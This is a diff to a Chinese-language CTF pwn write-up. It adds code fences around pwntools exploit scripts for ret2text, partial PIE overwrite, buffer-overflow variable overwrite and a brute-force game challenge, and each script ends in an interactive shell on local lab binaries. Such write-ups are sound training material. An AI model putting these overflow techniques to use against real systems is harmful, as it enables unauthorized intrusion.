@@ -38,8 +38,9 @@ checksec一下
 
 找到后门函数
 
-经典栈溢出，开始编写exp*（64位注意栈对齐TnT）
+经典栈溢出，开始编写exp（64位注意栈对齐TnT）
 
+```python
 from pwn import *
 
 io = process("./ret2text")
@@ -52,7 +53,7 @@ payload = b'a' * padding + p64(ret) + p64(address)
 io.sendline(payload)
 
 io.interactive()
-
+```
 ![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737625100599-4a5565db-3b27-4a77-ab0c-0e396708f264.png)
 打通本地
 
@@ -90,6 +91,7 @@ io.interactive()
 
 编写exp
 
+```python
 from pwn import *
 
 io = process("./pie")
@@ -100,7 +102,7 @@ payload = b'a'*padding + b'\x6c'
 
 io.sendline(payload)
 io.interactive()
-
+```
 打通
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626164236-990c6e20-7ab3-4172-8730-fada3a2b0156.png)
@@ -118,7 +120,7 @@ io.interactive()
 但是v5无法靠输入修改，所以编写脚本把v5直接覆盖
 
 exp：
-
+```python
 from pwn import *
 
 io = process('./buffer_overflow')
@@ -127,7 +129,7 @@ payload = b'a'* 0x46 + b'Limiter and Wings are beautiful girls!'
 io.send(payload)
 
 io.interactive()
-
+```
 打通
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626563439-02347b83-21bb-4a45-b413-d433fcb65c9b.png)
@@ -143,7 +145,7 @@ io.interactive()
 发现v1累加到999就可以获取shell
 
 编写脚本暴力发送直到v1达到999
-
+```python
 from pwn import *
 
 io = process("./game")
@@ -154,7 +156,7 @@ while i <= 999:
     i += 9
 
 io.interactive()
-
+```
 打通
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626889726-977db26f-d640-4503-aa84-cdf4959f0c67.png)
